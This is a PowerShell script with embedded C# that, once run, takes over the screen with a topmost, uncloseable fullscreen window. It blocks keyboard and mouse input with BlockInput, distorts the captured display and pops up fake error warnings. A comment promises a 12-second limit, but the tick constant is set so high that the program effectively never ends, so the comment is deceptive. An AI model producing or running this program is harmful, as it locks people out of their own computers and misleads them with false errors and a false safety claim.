Add-Type @"
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class ScreenGlitch : Form {
    [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, int rop);
    [DllImport("user32.dll")] static extern bool BlockInput(bool fBlockIt);

    private Bitmap original, buffer;
    private Random rnd = new Random();
    private int screenW, screenH;
    private System.Windows.Forms.Timer timer;
    private long ticks = 0;
    
    // Strict 12-second threshold calculation: 400 ticks * 30ms = 12000ms
    private const long MAX_TICKS = 9999999999999999L; 
    
    private int activePopups = 0;
    private const int MAX_POPUPS = 2; 

    protected override CreateParams CreateParams {
        get {
            CreateParams cp = base.CreateParams;
            const int CS_NOCLOSE = 0x200;
            cp.ClassStyle |= CS_NOCLOSE;
            return cp;
        }
    }

    public ScreenGlitch() {
        screenW = Screen.PrimaryScreen.Bounds.Width;
        screenH = Screen.PrimaryScreen.Bounds.Height;

        original = new Bitmap(screenW, screenH);
        using (Graphics g = Graphics.FromImage(original)) {
            IntPtr hdcDest = g.GetHdc();
            IntPtr hdcSrc = GetDC(IntPtr.Zero);
            BitBlt(hdcDest, 0, 0, screenW, screenH, hdcSrc, 0, 0, 0x00CC0020);
            g.ReleaseHdc(hdcDest);
        }

        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.DoubleBuffered = true;
        this.BackColor = Color.Black;

        this.FormClosing += (s, e) => {
            if (e.CloseReason == CloseReason.UserClosing) {
                e.Cancel = true;
            }
        };

        // Attempts to capture input focus during execution
        BlockInput(true);

        timer = new System.Windows.Forms.Timer();
        timer.Interval = 30; 
        timer.Tick += (s, e) => {
            ticks++;
            
            // Strict termination enforcement
            if (ticks > MAX_TICKS) {
                timer.Stop();
                BlockInput(false);
                Environment.Exit(0); 
                return;
            }
            
            Glitch();
            
            if (rnd.Next(0, 150) == 5 && activePopups < MAX_POPUPS) {
                SpawnErrorWindow();
            }
        };
        timer.Start();
    }

    void SpawnErrorWindow() {
        Interlocked.Increment(ref activePopups);
        
        Thread popupThread = new Thread(() => {
            string[] errors = {
                "Graphics canvas buffer overflow.",
                "Display pipeline timeout detection.",
                "Instruction reference fault."
            };
            
            string chosenError = errors[rnd.Next(0, errors.Length)];
            MessageBox.Show(chosenError, "Runtime Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            Interlocked.Decrement(ref activePopups);
        });
        
        popupThread.SetApartmentState(ApartmentState.STA);
        popupThread.Start();
    }

    void Glitch() {
        int roll = rnd.Next(0, 100);
        
        if (roll < 4) {
            buffer = (Bitmap)original.Clone();
            BitmapData d = buffer.LockBits(new Rectangle(0, 0, screenW, screenH), ImageLockMode.ReadWrite, PixelFormat.Format32bppArgb);
            int bCount = Math.Abs(d.Stride) * screenH;
            byte[] p = new byte[bCount];
            Marshal.Copy(d.Scan0, p, 0, bCount);
            for (int i = 0; i < bCount - 3; i += 4) {
                p[i] = (byte)(255 - p[i]);       
                p[i + 1] = (byte)(255 - p[i + 1]); 
                p[i + 2] = (byte)(255 - p[i + 2]); 
            }
            Marshal.Copy(p, 0, d.Scan0, bCount);
            buffer.UnlockBits(d);
            this.Invalidate();
            return;
        }

        if (roll >= 4 && roll < 8) {
            buffer = null;
            this.Invalidate();
            return;
        }

        buffer = (Bitmap)original.Clone();
        BitmapData data = buffer.LockBits(new Rectangle(0, 0, screenW, screenH), ImageLockMode.ReadWrite, PixelFormat.Format32bppArgb);
        int stride = data.Stride;
        int bytes = Math.Abs(stride) * screenH;
        byte[] px = new byte[bytes];
        Marshal.Copy(data.Scan0, px, 0, bytes);

        // Standard line shearing
        for (int row = 0; row < screenH; row += rnd.Next(1, 4)) {
            int shift = rnd.Next(-250, 250); 
            int rowStart = row * stride;
            byte[] rowCopy = new byte[stride];
            Array.Copy(px, rowStart, rowCopy, 0, stride);
            for (int x = 0; x < stride; x++) {
                int src = ((x + shift * 4) % stride + stride) % stride;
                px[rowStart + x] = rowCopy[src];
            }
        }

        int rShift = rnd.Next(20, 60) * 4;
        int bShift = -rnd.Next(20, 60) * 4;
        int gShift = rnd.Next(-15, 15) * 4;
        byte[] original_px = (byte[])px.Clone();
        
        for (int row = 0; row < screenH; row++) {
            int rowStart = row * stride;
            for (int x = 0; x < stride; x += 4) {
                int rSrc = rowStart + ((x + rShift) % stride + stride) % stride;
                int bSrc = rowStart + ((x + bShift) % stride + stride) % stride;
                int gSrc = rowStart + ((x + gShift) % stride + stride) % stride;
                
                px[rowStart + x + 2] = original_px[rSrc + 2]; 
                px[rowStart + x + 0] = original_px[bSrc + 0]; 
                px[rowStart + x + 1] = original_px[gSrc + 1]; 
            }
        }

        Marshal.Copy(px, 0, data.Scan0, bytes);
        buffer.UnlockBits(data);
        this.Invalidate();
    }

    protected override void OnPaint(PaintEventArgs e) {
        if (buffer != null) {
            e.Graphics.DrawImage(buffer, 0, 0);
            
            if (rnd.Next(0, 5) == 0) {
                int barY = rnd.Next(0, screenH);
                int barHeight = rnd.Next(10, 80);
                using (SolidBrush noiseBrush = new SolidBrush(Color.FromArgb(rnd.Next(100, 230), rnd.Next(0, 255), rnd.Next(0, 255), rnd.Next(0, 255)))) {
                    e.Graphics.FillRectangle(noiseBrush, 0, barY, screenW, barHeight);
                }
            }
        } else {
            e.Graphics.FillRectangle(Brushes.Black, this.ClientRectangle);
        }
    }

    protected override void OnFormClosed(FormClosedEventArgs e) {
        BlockInput(false);
        base.OnFormClosed(e);
    }
}

public class Launcher {
    public static void Run() {
        Application.EnableVisualStyles();
        Application.Run(new ScreenGlitch());
    }
}
"@ -ReferencedAssemblies System.Windows.Forms, System.Drawing

[Launcher]::Run()
